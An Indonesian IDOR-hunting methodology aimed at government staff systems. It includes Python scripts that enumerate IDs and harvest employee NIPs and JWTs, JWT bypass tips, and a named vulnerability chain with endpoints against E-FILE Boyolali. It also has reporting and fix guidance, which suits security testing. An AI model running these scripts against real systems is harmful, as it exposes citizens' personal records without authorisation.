---
name: idor-hunting
description: "Metodologi IDOR (Insecure Direct Object Reference) — teknik penemuan, eksploitasi, dan dokumentasi IDOR. Fokus pada aplikasi pemerintah Indonesia (SIMPEG, e-file, kepegawaian). Include horizontal & vertical privilege escalation."
---

# IDOR Hunting Reference

## 1. APA ITU IDOR

IDOR terjadi ketika aplikasi menggunakan identifier yang bisa dikontrol user (ID, NIP, UUID, JWT)
untuk mengakses objek tanpa validasi apakah user berhak akses ke objek tersebut.

```
Contoh klasik:
GET /user/profile?id=1001  → profil kamu sendiri
GET /user/profile?id=1002  → profil orang lain → IDOR!

Contoh dengan JWT:
GET /documents/{JWT_milikmu}   → dokumen kamu
GET /documents/{JWT_orang_lain} → dokumen orang lain → IDOR!
```

---

## 2. JENIS IDOR

### Horizontal IDOR (akses data level sama)
```
User A mengakses data User B (sesama user biasa)
Admin OPD1 mengakses dokumen pegawai OPD2
```

### Vertical IDOR (privilege escalation)
```
User biasa mengakses endpoint admin
Operator mengakses data yang seharusnya hanya untuk manager
```

### IDOR via Indirect Reference
```
Bukan ID langsung, tapi token/hash yang merepresentasikan objek
JWT, UUID, MD5 hash, encrypted ID → perlu decode dulu
```

---

## 3. WHERE TO LOOK

### Parameter yang sering IDOR
```
# URL path
/user/{id}/profile
/order/{order_id}/detail
/document/{uuid}/view
/employee/{nip}/files

# Query string
?id=1001&page=1
?user_id=abc123
?nip=199001011990011001

# POST body
{"user_id": 1001, "action": "view"}
{"nip": "199001011990011001"}

# Headers (jarang tapi ada)
X-User-ID: 1001
X-Employee-NIP: 199001011990011001

# Cookie / Session-derived objects
(diambil dari session di server, bukan dari client input)
```

### Endpoint high-risk di app pemerintah Indonesia
```
/pegawai/detail/{nip}
/dokumen/view/{id}
/surat/download/{id}
/laporan/cetak/{id}
/absensi/{nip}/{bulan}
/sk/download/{id}
/profil/edit/{id}
/cuti/approve/{id}
```

---

## 4. METODOLOGI HUNTING

### Step 1: Collect IDs/tokens
```python
# Perhatikan semua ID yang muncul saat pakai aplikasi:
# - Lihat URL bar
# - Inspect element pada links
# - Lihat response JSON dari API calls
# - Decode JWT tokens
# - Perhatikan hidden form fields

import base64, json

def decode_jwt(token):
    payload = token.split('.')[1]
    payload += '=' * (-len(payload) % 4)
    return json.loads(base64.b64decode(payload))
```

### Step 2: Manipulate & test
```python
# Ganti ID dengan ID lain yang valid
# Cara dapat ID valid:
# 1. Register akun kedua
# 2. Scan range ID (1, 2, 3... atau sekuensial)
# 3. Keyword search yang leak ID orang lain
# 4. Error messages yang expose ID

# Test pattern:
original_id = "1001"
for test_id in range(1000, 1010):
    r = s.get(f"{BASE}/user/profile?id={test_id}")
    if r.status_code == 200 and "username" in r.text:
        print(f"IDOR: {test_id}")
```

### Step 3: Verify different data
```
Pastikan data yang didapat BERBEDA dari milik kamu sendiri.
BUKAN hanya error 403 vs 200.
Harus: data orang lain yang beneran ter-expose.
```

---

## 5. IDOR VIA KEYWORD SEARCH (Teknik Gov Apps)

Aplikasi pemerintah sering punya endpoint search yang leak ID/NIP:

```python
# Search endpoint yang return NIP/ID pegawai lain
keywords = ["Ahmad", "Budi", "Siti", "Dewi", "Agus", "Eko", "Dini",
            "Rini", "Wahyu", "Hendra", "Fajar", "Dian", "Putri"]

found_employees = []
for keyword in keywords:
    r = s.post(f"{BASE}/employee/search", data={"q": keyword})
    # Parse response untuk dapat NIP + JWT/ID
    nips = re.findall(r'\d{18}', r.text)
    jwts = re.findall(r'eyJ[A-Za-z0-9._-]+', r.text)
    for nip, jwt in zip(nips, jwts):
        found_employees.append({"nip": nip, "jwt": jwt})
        print(f"Found: {nip}")

print(f"Total: {len(found_employees)} employees found")
```

---

## 6. IDOR VIA JWT ANALYSIS

JWT sering menyembunyikan object reference dalam payload:

```python
import base64, json

token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMDAxfQ.xxx"
payload = token.split('.')[1]
payload += '=' * (-len(payload) % 4)
data = json.loads(base64.b64decode(payload))
# {"user_id": 1001}

# Coba ganti user_id menjadi 1002
# Perlu forge JWT (butuh secret) ATAU cari cara lain:
# 1. alg:none bypass
# 2. Weak secret (coba crack dengan jwt_tool / hashcat)
# 3. Endpoint lain yang generate JWT untuk user lain
```

### JWT IDOR tanpa forge (application logic flaw)
```
Scenario:
1. Search endpoint return JWT untuk employee lain → use that JWT
2. Share feature generate JWT yang accessible ke user lain
3. JWT tidak di-bind ke session user → bisa dipakai siapapun

Temuan real (E-FILE Boyolali):
- /document_upload/search_employee → return JWT untuk setiap employee
- JWT tersebut bisa digunakan oleh admin_opd manapun
- → IDOR: akses dokumen pegawai dari OPD lain
```

---

## 7. IDOR DI CODEIGNITER 3 (CI3)

CI3 pattern yang sering vulnerable:

```php
// VULNERABLE: langsung pakai input dari user
$nip = $this->input->post('nip');
$pegawai = $this->db->get_where('tb_pegawai', ['nip' => $nip])->row();

// SECURE: validasi kepemilikan
$nip = $this->input->post('nip');
$opd_id = $this->session->userdata('opd_id');
$pegawai = $this->db->get_where('tb_pegawai', ['nip' => $nip, 'opd_id' => $opd_id])->row();
if (!$pegawai) { show_error('Akses ditolak'); }
```

### CI3 Endpoint IDOR checklist
```
/admin/profile/view/{id}     → ganti id
/pegawai/dokumen/{nip}       → ganti nip
/laporan/cetak/{id}          → ganti id
/surat/download/{uuid}       → ganti uuid
/absensi/rekap/{nip}/{bulan} → ganti nip
```

---

## 8. BYPASS IDOR MITIGATIONS

### Bypass UUID (tidak predictable)
```python
# UUID tidak bisa di-guess → dapatkan dari:
# 1. Search endpoint (jika ada)
# 2. Referrer/link dari email notification
# 3. Error messages yang expose UUID
# 4. API response yang leak UUID orang lain
# 5. Brute force jika UUID v1 (time-based)
```

### Bypass Indirect Reference Map
```
App mungkin pakai "token" sebagai alias untuk ID sebenarnya.
Cari endpoint yang map token ke ID:
POST /api/resolve → {"token": "abc123"} → {"id": 1001}
```

---

## 9. DOKUMENTASI IDOR (untuk report)

```
Template bukti IDOR yang kuat:
1. Account A (attacker) akses resource Account A → OK (baseline)
2. Account A (attacker) akses resource Account B → OK (IDOR!)
3. Tampilkan bahwa data yang muncul adalah milik B, bukan A
4. Screenshot URL + response + identifikasi data milik B
```

### Severity rating
```
Critical: IDOR pada financial data, password, PII sensitif + write access
High:     IDOR pada PII data + read/write
Medium:   IDOR pada data non-sensitif atau hanya baca
Low:      IDOR pada data yang sudah public sebagian
```

---

## 10. CHECKLIST IDOR

1. ☐ Identify semua endpoint dengan ID/token dalam URL atau body
2. ☐ Register/login 2 akun berbeda untuk comparison
3. ☐ Test setiap parameter ID dengan ID orang lain
4. ☐ Decode JWT → cek payload fields → manipulasi
5. ☐ Test search endpoint → dapat ID orang lain → akses langsung
6. ☐ Test horizontal (same role, different user)
7. ☐ Test vertical (user vs admin endpoints)
8. ☐ Verifikasi data yang ter-expose memang milik user lain
9. ☐ Dokumentasi: sebelum (akun A) vs sesudah (data akun B)
10. ☐ Cek write access: edit/delete data orang lain?

## TEMUAN REAL (E-FILE Boyolali 2026)

Vulnerability chain:
1. POST /admin_opd/document_upload/search_employee?nama=Agus
   → Return JWT untuk semua pegawai bernama Agus, tanpa filter OPD
2. GET /admin_opd/document_upload/documents/{JWT_AGUS}
   → Admin OPD lain bisa akses dokumen Agus Kurniawan
3. NIP verification bypass → verifikasi NIP apapun diterima
4. Upload form tersedia untuk edit/upload dokumen pegawai tersebut

Root cause: tidak ada WHERE opd_id = session.opd_id pada query search
